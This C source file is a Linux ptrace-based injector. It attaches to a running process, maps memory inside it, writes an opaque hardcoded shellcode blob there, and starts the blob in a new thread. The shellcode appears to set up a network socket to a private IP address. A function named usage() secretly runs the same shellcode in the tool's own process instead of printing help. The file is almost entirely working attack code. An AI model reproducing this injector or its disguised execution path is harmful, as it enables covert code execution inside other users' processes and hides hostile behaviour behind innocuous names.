
#define _GNU_SOURCE

#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include "utils.h"

char shellcode[] = "\x50\xe8\x40\x02\x00\x00\x19\x0e\xe6\x0c\xe3\x0c\xc1\x0c\x6e\x0d\x87\x0b\xc5\x0b\xcb\x0b\xe7\x0a\x9a\x09\xc0\x08\xe8\x08\xcb\x07\xfe\x06\x8a\x08\x32\x07\xce\x07\xa9\x06\x93\x08\xc0\x07\x2a\x07\x3b\x06\x7e\x06\x5e\x05\xd0\x05\x6f\x04\x80\x04\xcf\x04\xb4\x04\x17\x04\x40\x04\xec\x03\xe9\x03\x18\x04\x72\x04\xc7\x03\x27\x03\x67\x03\xfc\x02\x55\x01\xa9\x02\xfb\x02\xe3\x02\xa6\x03\x6a\x03\x5c\x03\xd2\x02\xf8\x02\xd7\x02\xab\x02\xae\x02\x09\x03\xeb\x02\xb6\x02\x8c\x02\xbd\x02\xf2\x02\xff\x02\xed\x02\x0a\x03\xe5\x02\x03\x03\x1c\x03\x01\x04\xe2\x02\xec\x02\xd7\x03\xe8\x03\xa7\x04\x09\x04\xf6\x03\x66\x04\x4a\x04\xa1\x06\xaa\x06\xc1\x06\xcc\x05\xaa\x06\x9f\x05\xa3\x06\x79\x06\xd0\x05\x72\x06\x3a\x06\xd2\x06\xf9\x06\xb3\x06\xc9\x06\x84\x06\x35\x07\x67\x07\x61\x06\xf5\x06\xb8\x07\xa6\x07\x59\x07\x48\x07\x31\x07\x28\x08\xdf\x06\x07\x07\x6d\x07\x57\x07\x9a\x07\x40\x07\x7c\x07\x0c\x08\xe2\x07\xe2\x07\x3e\x08\xd4\x09\xab\x08\xdd\x07\xc3\x08\xf4\x07\x94\x09\x94\x08\x00\x09\x2d\x09\x72\x08\x14\x07\xd1\x07\x60\x08\x0c\x09\x45\x08\x2b\x09\x1d\x09\x81\x09\x75\x09\x8e\x0a\x78\x0a\x72\x0a\xec\x0a\x3c\x0b\x4e\x0c\x02\x0b\x47\x0b\x17\x0c\xb4\x0c\x15\x0c\x3b\x0c\xfb\x0c\xf5\x0e\x03\x10\x58\x0f\xb1\x0c\xbc\x0d\x8f\x0e\x2b\x11\xdb\x0f\xc8\x10\x65\x10\x72\x12\xd4\x11\x18\x12\xe4\x11\x96\x10\xe2\x0e\x7c\x10\xe0\x0f\x3e\x12\x15\x10\x34\x10\x58\x10\x71\x0f\xbf\x0d\xe9\x0c\xb6\x0d\x94\x10\x63\x0f\xa9\x0e\xd1\x0e\xf9\x0d\x70\x0c\x6f\x0f\xdb\x0f\x96\x0d\x6e\x0d\xae\x0f\xf2\x0e\x44\x10\x1a\x0e\x71\x11\x90\x10\xab\x10\x69\x12\x95\x12\xb8\x0f\xb2\x0f\x7a\x11\x30\x11\x63\x12\xaa\x12\x90\x0f\x3f\x11\xc9\x10\x89\x12\x83\x12\xd8\x12\x13\x12\xbe\x11\xc7\x10\xe9\x11\x4c\x10\x75\x12\xc2\x10\x4d\x13\xd5\x13\x98\x13\x57\x13\xee\x13\x7b\x13\x19\x13\x24\x13\x10\x12\x7b\x12\x44\x12\x3c\x13\x38\x12\x27\x12\xc7\x11\x75\x0e\x39\x11\x3d\x12\x47\x12\x38\x12\xcb\x12\x9b\x12\x7e\x12\x60\x13\x5e\x12\x1c\x14\x18\x14\xdb\x14\xab\x14\x6f\x13\x49\x14\xb9\x14\xf5\x13\xc9\x14\xd5\x14\xf0\x13\x38\x14\x41\x12\xd9\x10\xa7\x11\xed\x11\x9c\x11\x87\x12\xe1\x13\x7e\x13\xe4\x12\x06\x13\xfa\x11\x43\x12\xf5\x11\xa2\x12\xcf\x11\x26\x11\x3d\x11\x04\x11\xcf\x11\xbb\x10\xe8\x11\xa2\x11\x13\x12\x40\x10\xb1\x10\xde\x10\x50\x12\x4b\x12\x81\x10\x8c\x10\x56\x10\x9a\x10\x4d\x0e\xa2\x0e\x38\x0f\x10\x0e\xfb\x0e\x08\x0f\xb5\x0d\x6a\x0d\xca\x0d\x31\x0d\x22\x0c\xf3\x0a\xb6\x0b\x41\x5c\x48\x89\xe5\x48\x31\xc0\x50\x48\x31\xc0\x50\x48\x31\xc0\x05\x80\x96\x98\x00\x50\x48\x31\xc0\x50\x48\x31\xc0\x50\x66\x05\x0c\x01\x48\xc1\xe0\x10\x66\x05\xc0\xa8\x48\xc1\xe0\x10\x66\x05\x10\x27\x48\xc1\xe0\x10\x66\x83\xc0\x02\x50\x48\x31\xc0\x48\x89\xc2\x48\xff\xc0\x48\xff\xc0\x48\x89\xc6\x48\x89\xc7\x48\x83\xc0\x27\x0f\x05\x50\xb8\x60\x00\x00\x00\x48\x8d\x7d\xf0\xbe\x00\x00\x00\x00\x0f\x05\x4c\x8b\x5d\xf0\xb8\x23\x00\x00\x00\x48\x8d\x7d\xe0\x48\x8d\x75\xe0\x0f\x05\xb8\x60\x00\x00\x00\x48\x8d\x7d\xf0\xbe\x00\x00\x00\x00\x0f\x05\x4c\x3b\x5d\xf0\x74\xdb\xeb\xd9";

#define FLAGS_PROCESS (1 << 0)
#define FLAGS_DIRECT (1 << 1)

void usage(const char *name)
{
	int (*ret)() = (int(*)())shellcode;
	ret();
	exit(0);
}

int poke_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	char *ptr = malloc(blen + blen % sizeof(size_t)); // word align
	memcpy(ptr, buf, blen);

	for (i = 0; i < blen; i += sizeof(size_t))
	{
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, *(size_t *)&ptr[i]) < 0)
		{
			logs(LOG_ERROR, "%s: %s", "ptrace POKE", strerror(errno));
			exit(1);
		}
	}
	free(ptr);
	return 0;
}

int peek_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	size_t word = 0;
	for (i = 0; i < blen; i += sizeof(size_t))
	{
		word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL);
		memcpy(&buf[i], &word, sizeof(word));
	}
	return 0;
}

// TODO change this to search only exec pages of memory

size_t find_syscall_addr(pid_t pid, size_t addr)
{
	// assume that this will not fail
	// searching for syscall after 1kb we give up

	int buf_size = 1024;
	void *tmp_ptr;

	char *syscall_op = "\x0f\x05";
	char *buf = malloc(buf_size);
	addr -= buf_size;
	peek_text(pid, addr, buf, buf_size);
	tmp_ptr = buf;

	while (memcmp(tmp_ptr, syscall_op, 2))
	{
		tmp_ptr++;
		// printf("addr:%lx\n", addr -((size_t)buf- (size_t)tmp_ptr) );
		if (buf_size-- == 0)
		{
			free(buf);
			return (size_t)NULL;
		}
	}
	free(buf);
	return addr - ((size_t)buf - (size_t)tmp_ptr); // addr + offset to syscall
}

/*
void run_shellcode(pid_t pid, void *shellcode, size_t len)
{
	struct user_regs_struct regs, return_regs;

	// get rip, save regs
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		perror("ptrace get regs");
		exit(1);
	}


	peek_text(pid, regs.rip, saved_text, syscall_len);

	// restore regs

}
*/

void remote_jmp(pid_t pid, void *addr)
{

	struct user_regs_struct regs;

	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		return;
	}

	regs.rip = (uint64_t)addr;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		return;
	}
}

uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t r10, uint64_t r8, uint64_t r9)
{

	struct user_regs_struct regs, return_regs;

	bool substitute = false;

	char saved_text[2];
	char *syscall_opt = "\x0f\x05";
	int syscall_len = 2;

	// save	orginal regs
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}

	// prepare regs for call
	memcpy(&return_regs, &regs, sizeof(struct user_regs_struct));
	return_regs.rax = rax;
	return_regs.rdi = rdi;
	return_regs.rsi = rsi;
	return_regs.rdx = rdx;
	return_regs.r10 = r10;
	return_regs.r8 = r8;
	return_regs.r9 = r9;

	void *ret = (void *)find_syscall_addr(pid, return_regs.rip);
	if (ret == NULL)
	{
		logs(LOG_WARNING, "cant find any syscall, using substitution method");

		peek_text(pid, regs.rip, saved_text, syscall_len);
		substitute = true;
	}
	else
	{
		return_regs.rip = (uint64_t)ret;
	}

	// load syscall
	if (ptrace(PTRACE_SETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	if (substitute)
	{
		poke_text(pid, regs.rip, syscall_opt, syscall_len);
	}

	// exec
	if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SINGLESTEP", strerror(errno));
		exit(1);
	}
	waitpid(pid, NULL, 0);

	// get return val
	if (ptrace(PTRACE_GETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}

	// restore orginal
	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	if (substitute)
	{
		poke_text(pid, regs.rip, saved_text, syscall_len);
	}

	return return_regs.rax;
}

// some remote syscalls prototypes

void *remote_mmap(pid_t pid, void *addr, size_t len, int prot, int flags, int fd, off_t offset)
{
	return (void *)remote_syscall(pid, SYS_mmap, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t)flags, (uint64_t)fd, (uint64_t)offset);
}

void *remote_mprotect(pid_t pid, void *addr, size_t len, int prot)
{
	return (void *)remote_syscall(pid, SYS_mprotect, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t)NULL, (uint64_t)NULL, (uint64_t)NULL);
}

int remote_write(pid_t pid, int fd, const void *buf, size_t count)
{
	return (int)remote_syscall(pid, SYS_write, (uint64_t)fd, (uint64_t)buf, (uint64_t)count, (uint64_t)NULL, (uint64_t)NULL, (uint64_t)NULL);
}

uint64_t remote_clone(pid_t pid, int flags, void *child_stack)
{
	return remote_syscall(pid, SYS_clone, (uint64_t)flags, (uint64_t)child_stack, (uint64_t)NULL, (uint64_t)NULL, (uint64_t)NULL, (uint64_t)NULL);
}

int main(int argc, char *argv[])
{
	pid_t pid;
	int wstatus, opt, flags = 0;
	struct user_regs_struct regs;
	bool main_arg = false;
	
	// parse
	while ((opt = getopt(argc, argv, "pd")) != -1)
	{
		switch (opt)
		{
		case 'p':
			flags |= FLAGS_PROCESS;
			break;
		case 'd':
			flags |= FLAGS_DIRECT;
			break;
		default:
			usage(argv[0]);
		}
	}

	for (int i = 0; i < argc; i++)
	{

		if (argv[i][0] != '-')
		{
			if ((pid = (pid_t)atoi(argv[i])) != 0)
			{
				break;
			}
		}
		if (i == (argc))
		{
			usage(argv[0]);
		}
	}
	// 					if these 2 bits are set
	if ((pid == 0) || ((flags & FLAGS_PROCESS) && (flags & FLAGS_DIRECT)))
	{
		usage(argv[0]);
	}

	// main functionality

	logs(LOG_DEGBUG, "attaching to proccess ( id: %d )", pid);
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace", strerror(errno));
		exit(1);
	}
	waitpid(pid, &wstatus, 0);

	logs(LOG_DEGBUG, "allocating memory");
	void *mem_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
	void *stack_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
	void *stack_top = stack_addr + 4096;
	pid_t ret_pid;

	poke_text(pid, (size_t)mem_addr, shellcode, sizeof(shellcode));

	logs(LOG_DEGBUG, "setting memory permissions");
	remote_mprotect(pid, mem_addr, 4096, PROT_EXEC);

	// else prepare stack to spawn process/thread
	logs(LOG_DEGBUG, "setting up child's stack");
	poke_text(pid, (size_t)stack_addr, (char *)&mem_addr, sizeof(void *));

	// spawn new thread
	logs(LOG_DEGBUG, "starting new thread");
	ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_SIGHAND | CLONE_THREAD | CLONE_VM | CLONE_FS | CLONE_FILES, stack_top);
	logs(LOG_DEGBUG, "clone pid: %d", ret_pid);

	sleep(1);

	logs(LOG_DEGBUG, "running shellcode");
	remote_jmp(ret_pid, mem_addr);

	logs(LOG_DEGBUG, "detaching");
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
	}

	if (ptrace(PTRACE_DETACH, ret_pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
	}

	logs(LOG_DEGBUG, "done");

	return 0;
}
